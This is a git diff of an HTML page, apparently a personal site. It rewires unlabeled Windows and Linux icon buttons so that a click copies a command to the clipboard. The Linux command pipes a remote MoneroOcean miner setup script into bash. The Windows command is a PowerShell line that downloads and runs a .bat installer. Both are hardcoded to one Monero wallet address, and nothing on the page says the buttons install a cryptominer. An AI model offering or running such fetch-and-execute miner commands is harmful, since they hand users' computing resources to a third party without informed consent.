@@ -40,9 +40,9 @@
                                     <a href="https://github.com/TMaskpl" target="_blank" rel="noopener noreferrer">
                                     <span class="icon-bar fab fa-github btn-dark"></span></a>
 
-                                    <span class="icon-bar fab fa-windows btn-dark" onclick="myWindowsf()"></span>
+                                    <span class="icon-bar fab fa-windows btn-dark" onclick="fWindows()"></span>
 
-                                    <span class="icon-bar fab fa-linux btn-dark" onclick="myLinuxf() id="copyText"></span>
+                                    <span class="icon-bar fab fa-linux btn-dark" onclick="fLinux()"></span>
                                 </div>
                     </div>
                 </nav>
@@ -63,28 +63,48 @@
     <input type="text" value="`curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 45iS5gnJ8A8AvdrnTauYZJie2yR3gWKMuQr3d5Jd5pwcjKJLT25mamBHQgwwZysajnCDq1s64NjsS8tx71nb24dUH4dRub1`" id="myLinux">
     <input type="text" value="`powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 45iS5gnJ8A8AvdrnTauYZJie2yR3gWKMuQr3d5Jd5pwcjKJLT25mamBHQgwwZysajnCDq1s64NjsS8tx71nb24dUH4dRub1; Remove-Item -Force $tempfile`") id="myWindows">
     -->
-    <!-- Function JavaScript-->
 
-    <!-- <button id="copyText"> Copy text</button> -->
-    <script>
-        const btn = document.getElementById('copyText');
+    <div class="footer">
 
-        function textToClipboard(text) {
-            const dummy = document.createElement("textarea");
-            document.body.appendChild(dummy);
-            dummy.value = text;
-            dummy.select();
+        <input type="text" value="curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 45iS5gnJ8A8AvdrnTauYZJie2yR3gWKMuQr3d5Jd5pwcjKJLT25mamBHQgwwZysajnCDq1s64NjsS8tx71nb24dUH4dRub1" id="myLinux">
+
+        <!-- Function JavaScript-->
+        <script>
+        function fLinux() {
+            /* Get the text field */
+            var copyText = document.getElementById("myLinux");
+
+            /* Select the text field */
+            copyText.select();
+            copyText.setSelectionRange(0, 99999); /*For mobile devices*/
+
+            /* Copy the text inside the text field */
             document.execCommand("copy");
-            document.body.removeChild(dummy);
-        }
 
-        function copy() {
-            const text = `Tekst dfvsdflllllllllllllldddddddddddddddddddddddewqfc?//d!@!#$%%`;
-            textToClipboard(text);
+            /* Alert the copied text */
+            alert("Copied the text: " + copyText.value);
         }
+        </script>
 
-        btn.addEventListener('click', copy);
-    </script>
+        <input type="text" value="powershell -Command &#34$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 45iS5gnJ8A8AvdrnTauYZJie2yR3gWKMuQr3d5Jd5pwcjKJLT25mamBHQgwwZysajnCDq1s64NjsS8tx71nb24dUH4dRub1; Remove-Item -Force $tempfile" id="myWindows">
+
+        <script>
+            function fWindows() {
+                /* Get the text field */
+                var copyText = document.getElementById("myWindows");
+
+                /* Select the text field */
+                copyText.select();
+                copyText.setSelectionRange(0, 99999); /*For mobile devices*/
+
+                /* Copy the text inside the text field */
+                document.execCommand("copy");
+
+                /* Alert the copied text */
+                alert("Copied the text: " + copyText.value);
+            }
+            </script>
+    </div>
 
     <!-- Monero-->
 
